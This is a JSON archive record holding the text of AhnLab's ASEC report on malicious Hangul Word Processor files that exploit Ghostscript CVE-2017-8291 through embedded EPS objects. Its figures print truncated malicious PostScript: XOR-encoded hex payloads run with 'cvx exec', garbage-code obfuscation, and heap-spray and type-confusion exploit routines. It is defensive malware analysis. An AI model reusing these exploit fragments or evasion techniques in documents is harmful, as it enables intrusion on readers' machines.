{
    "id": "a36fbe34-3f2e-4290-87d5-b5388baf0bcc",
    "created_at": "2022-10-25T16:48:21.900733Z",
    "updated_at": "2025-03-27T02:06:08.114856Z",
    "deleted_at": null,
    "sha1_hash": "61e28d6bfe21e4e27c946ef0478ad222e6903063",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-07-02T10:24:34Z",
    "file_modification_date": "2020-07-02T10:24:34Z",
    "file_size": 118643,
    "plain_text": "### Vol.99\n\n\n-----\n\n## Contents\n\n##### Malicious Hangul Word Processor Files Exploiting Ghostscript Vulnerability\n\n Types of Malicious HWP Files Discovered in 2020 03\n\n Analysis of Ghostscript Vulnerability and Malicious EPS Files 05\n\n Changes in the Recent PostScript Code 07\n\n Conclusion 08\n\n\n#### Report Vol.99 2020 Q2\n\n\n###### ASEC (AhnLab Security Emergency-response Center) is a global security response group consisting of\n\n malware analysts and security experts. This report is published by ASEC and focuses on the most significant\n\n security threats and latest security technologies to guard against such threats. For further details, please visit\n\n AhnLab, Inc.â€™s homepage (www.ahnlab.com).\n\n\n-----\n\n# Malicious Hangul Word Processor Files Exploiting Ghostscript Vulnerability\n\n##### HWP (Hangul Word Processor) is a word processing application that is relatively popular\n\n in South Korea and in parts of APAC region. HWP files exploiting Ghostscript vulnerability\n\n (CVE-2017-8291) was first discovered in mid-2017. And almost three years later, the same\n\n vulnerability is still being exploited even after countless security updates and security\n\n advisories for HWP files.\n\n ASEC (AhnLab Security Emergency-response Center) analysis team has released a report\n\n regarding the malicious HWP files exploiting Ghostscript vulnerability in 2019. However, not\n\n much has changed since then. The main target for the attack and the vulnerability exploited\n\n for the attacks remain the same. The main target of the attacks are public sectors and\n\n cryptocurrency-related organizations.\n\n Apart from the shellcode and operational differences, what else has changed about the attack\n\n methods? This analysis report will examine the HWP file attacks that exploited Ghostscript\n\n vulnerability in numerous occasions and introduce the significant changes that occurred in\n\n 2020.\n\n 1. Types of Malicious HWP Files Discovered in 2020\n\n Details regarding the HWP files that exploited the Ghostscript (CVE-2017-8291) vulnerability\n\n can be seen in Figure 1. However, Figure 1 only shows a sample of the malicious HWP files that\n\n were discovered from January to May of this year.\n\n\n-----\n\nTable 1. Sample of the malicious HWP files that were discovered in 2020\n\n##### Attacks using malicious HWP files mostly targeted a certain profession or group by\n\n impersonating as a government institution, organization, or individual job seeker.\n\n The number of the overall attacks had increased from April 2020 due to the escalation of\n\n malware exploiting the COVID-19 situation. Even though the number of attacks had increased,\n\n the file details remained consistent. In fact, HWP files distributed across Incheon Metropolitan\n\n City, Busan Metropolitan City, and Jeollanam-do Province had only slight alterations.\n\n\n-----\n\n##### 2. Analysis of Ghostscript Vulnerability and Malicious EPS Files\n\n As explained in previous reports, EPS (Encapsulated PostScript) file inserted in the HWP\n\n document is the main reason behind the vulnerability. The malicious EPS object, which is an\n\n abnormal image format, is inserted into the document. The malware is executed when the\n\n Ghostscript interpreter attempts to process the EPS object to display the page on the screen.\n\n Thus, the attacker can produce numerous HWP files with various contents as long as the\n\n attacker had already developed an EPS file.\n\nFigure 1. Simplified attack method as of April 2020\n\n##### EPS files are commonly written in PostScript language. The attacker has been using the\n\n characteristics of the script language to change the code into various forms and ultimately\n\n avoid detection. Examples include garbage code insertion, variable substitution, and XOR\n\n encoding after saving the script in the <> hexadecimal data value.\n\n However, the malicious HWP files that were discovered this year changed its PostScript code\n\n as of April. Instead of using previous methods, such as XOR encoding or obfuscation method,\n\n it turned to a totally new method. It started to use the PostScript syntax, which is a simple yet\n\n powerful method of executing malicious functions.\n\n Simplified form indicates that it makes it harder to distinguish file-based malware from normal\n\n EPS files. The attacker could have avoided detection by removing the repetitive XOR encoding\n\n or code, and syntax substitution. However, that is not the route the attacker chose.\n\n\n-----\n\n##### But not everything had changed. In fact, some things remained the same even after June 2017.\n\n One of them being the CVE-2017-8291 vulnerability exploit code executed in the memory.\n\n\n/Y101 <E8E742638BF30B5687CCFDC34DF1739EE8E74163E3F40871B3F8DA9A09F070D8E7912A709AED587FAEF89\n2C34DF1739EE8E747638BE54962B3EBC2C34DF1739EE8E746638AE54C75A7AA94BA1FB42488E48F43739AA14D76\nE1A5E2D409CD239EA6CC0122C3E54C75A7AA94BA11B42488E4865327DFA3083F98B39BD21FB72486818E5327DF\nA3083F98BB8BC318A2368DF6FB5322C8B74969E1EE\n........\n6E7DF17279A9C1129E1D38AD409CD2C87E78F456088860871A5EE9BBA10A635E7F689531A8BF51830F0BC98A11\n9B474DAA39E2A7A8DE57121F6AAE2D219A4358FF19D4A7B9AA44C74E1D382D709CD2489E7E741638BE54F75B5\nAAD88F46E770D8AED21649> def 0 1 Y101 length 1 sub {/Y18 exch def Y101 33 pop dup Y18 get <C7BE7343BAC52\n810C18ABBE3299415BE> Y18 15 and get xor Y18 exch put} for Y101 cvx 9348 pop exec\n\n\nFigure 2. Previous method of EPS file code (Encoding)\n\n##### Figure 2 and Figure 3 shows the previous method of EPS file code. It shows encoding, and also\n\n garbage code insertion.\n\n\n%!PS-Adobe-3.0\n%!PS-Adobe-2.0\n%%Creator: dvips(k) 5.993 Copyright 2013 Radical Eye Software\n........\n/Notice { token pop exch pop } bind def\n/FontSize <5C7B1BB7> def /DrawFont{/FontType exch def 0 1 FontType length 1 sub {/FontName exch def FontType\nFontName 2 copy get FontSize FontName 4 mod get xor put} for FontType \\\n} def <277134c4341e77db3f147fd27c4723d5394e2e8264197ed4641f23826a4b7dd53a1d7dd1644a7ed43d4b2b83\n6c4b2b87694b7e8f6d4e2b866c4b2b87641f23826a4b7dd53a1d7dd1694b7e8f6\n........\n944d6381f69972b0972c3394829bd3a1277d2031a7fd32e5b2a817f4223973d1f7f972e1e6fe83d1f7fc57c0c69de281\ne288556177ed6371e7fe83d0969d6255b2a973b1e6f973f1774c4391d72db39716ac2350f11ca56> DrawFont Notice\nexec\n/HPSdict 20 dict dup begin/braindeaddistill 50 def/rfch{dup length 1 sub\n1 exch getinterval}bind def/splituri{dup(#)search{exch pop}{()exch}\n........\n\n\nFigure 3. Previous method of EPS file code (Encoding, garbage code insertion)\n\n\n-----\n\n##### Figure 4 shows the recently changed method of EPS file code. Noticeable changes include\n\n deletion of garbage codes to make the code more simple.\n\n\n/image <2F78797A31203136234646464620646566202F78797A5F6C65616B65645F61727261792078797A3120617\n272617920646566202F78797A5F636F6E74726F6C5F7374722028706F6F72292064\n........\n72078797A31370A78797A5F7365636F6E645F617272617930203136233938206164642078797A39342078797A313\n70A78797A5F6C65616B65645F617272617920312067657420636C6F736566696C65> def image cvx exe\n\n\nFigure 4. New method of EPS file code\n\n##### 3. Changes in the Recent PostScript Code\n\n The new EPS file method uses PostScript syntax, as shown in Figure 5.\n\n\n/literal <hex..................data> def literal cvx exec\n\n\nFigure 5. Part of the Postscript code that was recently changed\n\n##### The literal data value expressed in hexadecimal is included in the < >, and after this literal\n\n object is defined as a variable through def. Then, it changes the object to be executable only\n\n through \"cvx exec\" and executes it subsequently. When the hexadecimal data in the < > is\n\n executed, the shellcode is also executed. The data within the < > is the PostScript code that\n\n executes the shellcode by creating the vulnerability. Three variable names (/image, /tomato, /\n\n airplane) were used in the EPS files discovered between April and May of this year.\n\n\n-----\n\n/xyz1 16#FFFF def /xyz_leaked_array xyz1 array def /xyz_control_str (poor) def /xyz4 1 array def /xyz5 0 def /xyz_\nstr_count 16#100 def /xyz7 xyz_str_count array def /xyz8 16#8 def /xyz9 16#18F0 def /xyz_second_array 16#31E\narray def /xyz11 16#215 array def /xyz12 16#1 array def /xyz_spray { xyz_second_array aload 16#10 { xyz11 aload\n} repeat 16#100 { /xyz14 16#1520 string def} repeat 0 1 xyz_str_count 1 sub { /xyz15 16#1520 string def 0 1 xyz15\nlength 1 sub { xyz15 exch 1 put } for xyz7 exch xyz15 put } for } bind def /xyz16 { /xyz18 exch def /xyz19 xyz18 -15\nbitshift def /xyz21 xyz18 16#7FFF and def /xyz_cur_buf xyz_leaked_array xyz19 get def xyz_cur_buf xyz21 get xyz_\ncur_buf xyz21 1 add get 8 bitshift or xyz_cur_buf xyz21 2 add get 16 bitshift or xyz_cur_buf xyz21 3 add get 24\nbitshift or } bind def\n..........\n\n\nFigure 6. Sample of EPS file vulnerability execution code\n\n##### Since the operational method remains consistent, the overall flow of stack pointer\n\n movement, creation of type confusion vulnerability, shellcode and gadget execution using\n\n the altered type object remains the same even after the code form had changed.\n\nFigure 7. Stack pivoting before shellcode execution\n\n##### 4. Conclusion\n\n Since attacks using HWP files are targeted towards various groups, there is a possibility that\n\n the above malicious EPS file form might change once again. Thus, it is important to constantly\n\n analyze and assess the possibility of the code pattern being temporary or being continuously\n\n used in times to come.\n\n\n-----\n\n##### AhnLab's anti-malware product, V3 detects and blocks HWP malware using the following\n\n aliases:\n\n - HWP/Exploit\n\n - Exploit/HWP.Generic\n\n - Exploit/EPS.Generic\n\n - Malware/MDP.Behavior.M2411\n\n\n-----\n\n#### Report Vol.99\n\nContributors **ASEC Researchers**\n\nEditor **Content Creatives Team**\n\nDesign **Design Team**\n\n\nPublisher **AhnLab, Inc.**\n\nWebsite **www.ahnlab.com**\n\nEmail **global.info@ahnlab.com**\n\n\nDisclosure to or reproduction for others without the specific written authorization of AhnLab is prohibited.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/Report/AhnLab/ASEC_REPORT_vol.99_ENG.pdf"
    ],
    "report_names": [
        "ASEC_REPORT_vol.99_ENG"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1593685474,
    "ts_modification_date": 1593685474,
    "files": {
        "pdf": "https://archive.orkl.eu/61e28d6bfe21e4e27c946ef0478ad222e6903063.pdf",
        "text": "https://archive.orkl.eu/61e28d6bfe21e4e27c946ef0478ad222e6903063.txt",
        "img": "https://archive.orkl.eu/61e28d6bfe21e4e27c946ef0478ad222e6903063.jpg"
    }
}